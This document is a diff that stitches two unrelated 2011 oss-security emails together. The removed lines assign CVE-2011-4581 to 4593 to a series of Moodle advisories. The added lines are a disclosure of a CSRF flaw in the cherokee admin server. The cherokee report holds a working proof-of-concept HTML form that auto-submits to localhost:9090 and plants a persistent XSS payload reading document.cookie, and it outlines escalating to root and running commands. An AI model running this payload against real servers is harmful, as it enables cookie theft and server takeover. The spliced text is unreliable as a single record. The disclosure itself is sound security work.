@@ -1,141 +1,61 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/12/07/7
-Message-ID: <4EDFEB23.8050505@redhat.com>
-Date: Wed, 07 Dec 2011 15:39:31 -0700
-From: Kurt Seifried <kseifried@...hat.com>
-To: oss-security@...ts.openwall.com
-CC: Vincent Danen <vdanen@...hat.com>
-Subject: Re: CVE request: Moodle 1.9.15/2.0.6/2.1.3 releases
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/03/6
+Message-ID: <1307116875.8176.11.camel@localhost>
+Date: Fri, 03 Jun 2011 11:01:15 -0500
+From: Jamie Strandboge <jamie@...onical.com>
+To: Alvaro Lopez Ortega <alvaro@...ality.com>
+Cc: oss-security@...ts.openwall.com
+Subject: Security issue in cherokee
 Content-Type: text/plain; charset=utf-8
 
-On 12/07/2011 03:11 PM, Vincent Danen wrote:
-> MSA-11-0042: Information leak in Wiki
-> Affects: 2.1.x, 2.0.x Fix:
-> http://git.moodle.org/gw?p=moodle.git;a=commit;h=140af2a0f0a4598bf568b9ae182cb81eb583edeb
-> Reference: http://moodle.org/mod/forum/discuss.php?d=191747
->
-Please use CVE-2011-4581 for this issue
+A security bug was reported against cherokee in Ubuntu. You are being
+emailed as the upstream contact. Please keep oss-security[1] CC'd for
+any updates on this issue.
 
+This issue should be considered public, but has not yet been assigned a
+CVE. Once a CVE is assigned, please mention it in any changelogs.
 
-> MSA-11-0043: Possible link redirect in Calendar
-> Affects: 2.1.x
-> Fix:
-> http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-28720&sr=1
->
-> Reference: http://moodle.org/mod/forum/discuss.php?d=191748
->
-Please use CVE-2011-4582 for this issue
+Details from the public bug follow:
+https://launchpad.net/bugs/784632
 
+From the reporter:
+----
+The cherokee admin server is vulnerable to csrf.
 
-> MSA-11-0044: Expired identification information shown in Web services
-> Affects: 2.1.x, 2.0.x
-> Fix:
-> http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-28670&sr=1
->
-> Reference: http://moodle.org/mod/forum/discuss.php?d=191750
->
-Please use CVE-2011-4583 for this issue
+Using csrf it is possible to produce a persistent xss in several pages -
+including the 'status' page via the 'nickname field' of a vserver.
+An example of this is the following:
 
+<html>
+<body>
+ <form action="http://127.0.0.1:9090/vserver/apply" method="post"
+id="xssform">
+ <input type="text" name="tmp!new_droot" value='/var/www/'></input>
+ <input type="text" name="tmp!new_nick" value='" onselect=alert(1)
+autofocus> <embed src="javascript:alert(document.cookie)">'></input>
+</form>
+<script>document.getElementById("xssform").submit();</script>
+</body>
 
-> MSA-11-0045: Potential to masquerade through MNet Affects: 2.1.x,
-> 2.0.x, 1.9.x
-> Fix:
-> http://git.moodle.org/gw?p=moodle.git;a=commitdiff;h=10df8657c1c138c0d0ab1d4796c552fcec0c299b
->
-> Reference: http://moodle.org/mod/forum/discuss.php?d=191751
->
-Please use CVE-2011-4584 for this issue
+A Worst case scenario could be something like the following:
+If a user is logged in and the cherokee admin server is running on
+localhost:9090 then if they visit a $bad page - the bad page may be able
+to send requests to the server so as to reconfigure it to:
 
+1. run as root
+2. the logging of error(or access) will run a command ...
+----
 
-> MSA-11-0046: Insecure authentication transmission
-> Affects: 1.9.x
-> Fix:
-> http://git.moodle.org/gw?p=moodle.git;a=commitdiff;h=01dd64a8c8aa95f793accea371b2392e662663c5
->
-> Reference: http://moodle.org/mod/forum/discuss.php?d=191752
->
-Please use CVE-2011-4585 for this issue
+Thanks in advance for your cooperation in coordinating a fix for this
+issue,
 
+Jamie Strandboge
 
-> MSA-11-0047: Possible injection attack in Calendar
-> Affects: 2.1.x, 2.0.x, 1.9.x
-> Fix:
-> http://git.moodle.org/gw?p=moodle.git;a=commitdiff;h=581e8dba387f090d89382115fd850d8b44351526
->
-> Reference: moodle.org/mod/forum/discuss.php?d=191754
->
-Please use CVE-2011-4586 for this issue
-
-
-> MSA-11-0048: Password loss issue
-> Affects: 2.1.x, 2.0.x, 1.9.x
-> Fix:
-> http://git.moodle.org/gw?p=moodle.git;a=commitdiff;h=e079e82c087becf06d902089d14f3f76686bde19
->
-> Reference: http://moodle.org/mod/forum/discuss.php?d=191755
->
-Please use CVE-2011-4587 for this issue
-
-
-> MSA-11-0049: Network restriction ineffective with MNet
-> Affects: 1.9.x
-> Fix:
-> http://git.moodle.org/gw?p=moodle.git;a=commitdiff;h=3ab2851d2a59721445945d0706c58092e07e861e
->
-> Reference: http://moodle.org/mod/forum/discuss.php?d=191756
->
-Please use CVE-2011-4588 for this issue
-
-
-> MSA-11-0050: Backup capability issue
-> Affects: 2.1.x, 2.0.x
-> Fix:
-> http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-29591
->
-> Reference: http://moodle.org/mod/forum/discuss.php?d=191758
->
-Please use CVE-2011-4589 for this issue
-
-
-> MSA-11-0051: Authentication issue with Web services
-> Affects: 2.1.x, 2.0.x
-> Fix:
-> http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-28629
->
-> Reference: http://moodle.org/mod/forum/discuss.php?d=191759
->
-Please use CVE-2011-4590 for this issue
-
-
-> MSA-11-0052: Potential to exploit developer debugging scripts
-> Affects: 2.1.x, 2.0.x
-> Fix:
-> http://git.moodle.org/gw?p=moodle.git;a=commit;h=187672608ec96659e07f2461b3b83634debd16cb
->
-> Reference: http://moodle.org/mod/forum/discuss.php?d=191760
->
-Please use CVE-2011-4591 for this issue
-
-
-> MSA-11-0053: Security and system administration conflict
-> Affects: 2.1.x, 2.0.x
-> Fix:
-> http://git.moodle.org/gw?p=moodle.git;a=commit;h=ade30ad3c420ce035a3d68287db701b70e806b3f
->
-> Refrence: http://moodle.org/mod/forum/discuss.php?d=191761
->
-Please use CVE-2011-4592 for this issue
-
-
-> MSA-11-0054: Personal information leak
-> Affects: 2.1.x, 2.0.x
-> Fix:
-> http://git.moodle.org/gw?p=moodle.git;a=commit;h=e94113a859015a4a80b9397957b8fc4044e2951f
->
-> Reference: http://moodle.org/mod/forum/discuss.php?d=191762
-Please use CVE-2011-4593 for this issue
+[1] oss-security@...ts.openwall.com is a public mailing list for
+    people to collaborate on security vulnerabilities and coordinate
+    security updates.
 
 -- 
+Jamie Strandboge             | http://www.canonical.com
 
--Kurt Seifried / Red Hat Security Response Team
-
+Download attachment "signature.asc" of type "application/pgp-signature" (837 bytes)
